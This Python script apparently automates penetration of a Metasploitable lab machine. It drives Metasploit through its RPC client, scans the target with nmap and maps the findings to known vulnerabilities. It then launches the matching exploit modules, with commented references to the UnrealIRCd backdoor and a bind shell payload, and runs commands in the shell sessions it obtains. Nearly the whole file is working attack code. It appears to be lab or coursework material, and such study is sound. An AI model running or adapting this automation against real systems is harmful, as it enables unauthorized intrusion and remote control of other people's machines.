# for now this nmaps metasploitable, checks if port 6667 is open which runs UnrealIRCd
# which has a vulnerability, and then it exploits that
# NOT ALL VULNERABILITIES LIKE TO RUN AT THE SAME TIME.  SOME ONLY WORK WHEN RUN INDIVIDUALLY

import time
import sys
import os
sys.path.append(os.getcwd() + "/lib/")
from lib.msfrpc4 import *
import nmap_dest
import random as rd
import re
import utils
import subprocess
from knownVulnerabilities import vulnerabilities

CHECKMODE = False # will check for exploits rather than running them when can
EXPLOITNUM = 3 # for testing
RHOSTS = ["192.168.130.128"] # PUT YOUR HOST HERE or feed it in through console
if len(sys.argv) > 1:
    RHOSTS = sys.argv[1]
startTime = time.time()

# Test your exploits here first cuz they won't work as reliably when all exploits are run at once below
def runExploits(vulnerabilitiesToUse = set([vulnerabilities[EXPLOITNUM]])):
    strRHOSTS = ", ".join(RHOSTS)
    print("Exploiting vulnerabilities on " + strRHOSTS) 
    console = client.consoles.console()
    for vulnerability in vulnerabilitiesToUse:
        module = vulnerability.module
        print("VULNERABILITY DESCRIPTION:", vulnerability.description)
        print("VULNERABILITY MODULE:", vulnerability.module)
        print("XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n")
        module = vulnerability.module
        print("YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY\n")
        exploit = client.modules.use(vulnerability.exploitType, module)
        print("ZZZZZZZZZZZZZZZZZZZZZZZZZZZZz\n")
        # options = exploit.options
        exploit.missing_required
        if 'RHOSTS' in exploit.missing_required:
            exploit['RHOSTS'] = RHOSTS[0] # TODO: change this to loop through
        if exploit.missing_required:
            print("missing options:", exploit.missing_required)
        if False: #TODO: delete this if the below works
            print("payload:", vulnerability.payload)
            if CHECKMODE & vulnerability.canCheck:
                exploit.check_redo(payload=vulnerability.payload)
            else:
                exploit.execute(payload=vulnerability.payload)
        else:
            if CHECKMODE & vulnerability.canCheck:
                print("ONLY CHECKING EXPLOITABILITY")
                exploit.check_redo()
            else:
                print("################# RUNNING EXPLOIT,", vulnerability.description, "#################")
                # while console.is  _busy:
                #     time.sleep(1)
                #     print("BUSY CONSOLE", rd.randint(0,1))
                output = console.run_module_with_output(exploit, payload=vulnerability.payload)
                print("OUTPUT:\n", output)
                print("\n")
                result = utils.extractResult(output)
                print("OUTPUT extracted:\n", result)
                print("\n")
            # else:
            #     exploit.execute()
        print("ALL EXPLOITS SETUP AND RUNNING")
        while(client.jobs.list):
            print("JOB LIST @", round(time.time() - startTime, 2), "seconds:", client.jobs.list)
            time.sleep(10)
        print(client.sessions.list)

if __name__ == "__main__":
    #############################################################################
    # RUN ./setup.sh TO SET EVERYTHING UP.  This is for automating the exploit only
    # proc1 = subprocess.Popen(["yes | ./setup.sh"])
    # print("FINISHED SETTING UP SERVER")
    # time.sleep(180)
    # proc1.kill()

    # basically starts metasploit and kill all previous sessions 
    client = MsfRpcClient('PASSWORD', port=55553, ssl=True)
    for k in client.sessions.list.keys():
        client.sessions.session(str(k)).stop()
    print("Sessions list (should be empty):", client.sessions.list)
    for k in client.jobs.list.keys():
        client.jobs.stop(str(k))
    print("Jobs list (should be empty)", client.jobs.list)
    for console in client.consoles.list:
        k = console["id"]
        client.consoles.console(str(k)).destroy()
    print("Consoles (should be empty):", client.consoles.list)
    print()

    # output = self.client.consoles.console(console_id).run_module_with_output(exploit)                
    # dict_module['results'] = self.extractResult(output)
    # resultModules.append(dict_module)

    ######### TEST YOUR VULNERABILITY HERE (change the number below to the index of your exploit in the vulnerabilities list)
    runExploits()
    exit()
    ##############################################################################################

    ######## RECONAISSANCE PHASE ########
    nmapAggressiveness = 2
    # in order of increasing levels of fucking around (and also in increasing levels of finding out)
    nmapPossibleArgs = ["", "-A -T4", "-p- -sV -O", "-p- -sV -O -A -T5 -sC -Pn"]
    nmapArgs = nmapPossibleArgs[nmapAggressiveness]
    output = nmap_dest.nmap_xml_output(RHOSTS, nmapArgs)
    print(output)
    if (output[1][0:22] == "Note: Host seems down."):
        print("Host seems down. Exiting.")
        exit()

    ######## WEAPONIZATION PHASE ########
    vulnerabilitiesToUse = set()
    for line in output:
        # Detect what keywords each line of the nmap output contains and compare those to the descriptions
        # for each known vulnerability and if all key words of a vulnerability are found, add it to the exploit list
        for vulnerability in vulnerabilities:
            keyWordsFoundCount = 0
            flag = None
            if vulnerability.caseSensitiveKeyTermMatch:
                flag = 0
            else:
                flag = re.IGNORECASE
            # TODO: make it so there is a list of optional or guaranteed key terms
            for keyword in vulnerability.keywords:
                if re.search(keyword, line, flag):
                    keyWordsFoundCount += 1
            if keyWordsFoundCount < vulnerability.minKeyTermsThatMustMatch:
                continue
            if not vulnerability in vulnerabilitiesToUse:
                vulnerabilitiesToUse.add(vulnerability)
                print("*********", vulnerability.description, "EXPLOIT FOUND *********")

    ######## DELIVERY, EXPLOITATION, INSTALLATION PHASE ########
    # exploit = client.modules.use(vulnerability.exploitType, 'unix/irc/unreal_ircd_3281_backdoor')
    # exploit['RHOSTS'] = RHOSTS
    # payload = client.modules.use('payload', 'cmd/unix/bind_ruby')
    # exploit.execute(payload='cmd/unix/bind_ruby')
    runExploits(vulnerabilitiesToUse)
    
    while(client.jobs.list):
        print("JOB LIST @", round(time.time() - startTime, 2), "seconds:", client.jobs.list)
        time.sleep(10)

    ####### Print some info on the sessions created
    print("@@@@@@@@ ALL EXPLOITS FINISHED @@@@@@@@")
    sessions = client.sessions.list
    numSessions = 0
    for k in client.sessions.list.keys():
        numSessions += 1
    print("Number of sessions created:", numSessions)

    for k in client.sessions.list.keys():
        shell = client.sessions.session(str(k))
        shell.write('whoami')
        shell.write('pwd')
        print(shell.read())

    print()
    